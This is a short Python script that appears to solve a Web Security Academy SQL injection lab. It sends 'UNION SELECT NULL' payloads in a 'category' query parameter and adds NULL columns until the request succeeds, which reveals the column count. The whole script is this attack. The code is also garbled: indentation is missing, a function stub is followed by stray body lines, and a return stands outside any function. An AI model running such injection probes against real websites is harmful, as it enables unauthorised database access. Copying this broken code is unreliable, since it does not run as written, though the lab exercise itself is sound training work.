import requests
import sys
from bs4 import BeautifulSoup
import re
url = 'https://abcd.web-security-academy.net/'
url = f'{url}page'
params = {'category': 'Lifestyle'}
null = ["'UNION SELECT", 'NULL', '--']
sqli = {'category': f"Lifestyle{' '.join(null)}"}
api_session = requests.Session()
response = api_session.get(url, params=params)
if response.status_code == 404:
sys.exit('The session you are looking for has expired')
def sqli_union_lab_1(null, sqli):...
"""docstring"""
lab1 = api_session.get(url, params=sqli)
while not lab1.ok:
null.remove('--')
print(f"There are {null.count('NULL')} columns")
null.extend([',', 'NULL', '--'])
return null
sqli['category'] = f"Lifestyle{' '.join(null)}"
lab1 = api_session.get(url, params=sqli)
